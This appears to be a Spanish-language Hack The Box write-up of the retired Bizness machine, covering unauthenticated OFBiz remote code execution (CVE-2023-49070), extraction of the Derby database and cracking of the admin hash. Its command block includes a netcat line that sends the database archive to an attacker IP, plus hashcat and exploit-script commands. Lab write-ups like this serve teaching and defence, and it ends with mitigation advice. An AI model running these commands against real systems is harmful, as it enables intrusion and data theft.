---
machine: Bizness
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, ofbiz, cve-2023-49070, derby, hashcat]
---

# Bizness — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Apache OFBiz está expuesto y es vulnerable a CVE-2023-49070, una ejecución remota sin autenticación por XML-RPC. La shell permite extraer la base Apache Derby; el hash del administrador se reformatea y se crackea para llegar a root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,443,8443 <IP>
curl -k https://bizness.htb:8443/accounting/control/main
# CVE-2023-49070
python3 ofbiz_exploit.py https://bizness.htb:8443 <IP> 4444
# Base Derby
find / -type d -name seg0 2>/dev/null
tar czf /dev/shm/derby.tgz -C /opt/ofbiz/runtime/data/derby/ofbiz seg0
nc <IP> 4444 < /dev/shm/derby.tgz
# Hash
hashcat -m 12000 hash.txt /usr/share/wordlists/rockyou.txt
```

## Enumeración

- OFBiz en el puerto `8443` con la consola de contabilidad.
- Versión anterior a la corrección de CVE-2023-49070.
- Base Derby en `runtime/data/derby/ofbiz/seg0` y usuario `ofbiz` con acceso al árbol de la aplicación.

## Acceso inicial

Se identifica la versión de OFBiz y se lanza el exploit de XML-RPC con un payload de deserialización. El proceso devuelve una shell como `ofbiz`, sin credenciales previas.

## Escalada de privilegios

La base Derby contiene la tabla de usuarios con el hash del administrador. Se copia `seg0` con sus archivos de log, se abre con `ij` o DBeaver, se reformatea el hash y se crackea con `hashcat`. La contraseña permite `su root`.

## Evidencia

- Respuesta de OFBiz con la versión vulnerable.
- Callback de la shell tras el XML-RPC.
- Tabla de usuarios y hash crackeado; prompt de root.

## Lecciones aprendidas

- Un ERP expuesto concentra autenticación, datos y ejecución.
- Las bases embebidas se copian con el árbol de la aplicación.
- Los hashes de administrador deben ser lentos y con sal.

## Mitigación y detección

- Actualizar OFBiz y restringir el acceso a la consola.
- No ejecutar la aplicación con acceso de lectura a toda la base.
- Migrar a un almacén de identidades externo y rotar credenciales.

## Referencias

- [0xdf — Bizness](https://0xdf.gitlab.io/2024/05/25/htb-bizness.html)
- [NVD — CVE-2023-49070](https://nvd.nist.gov/vuln/detail/CVE-2023-49070)
- [Hack The Box — Bizness](https://app.hackthebox.com/machines/bizness)
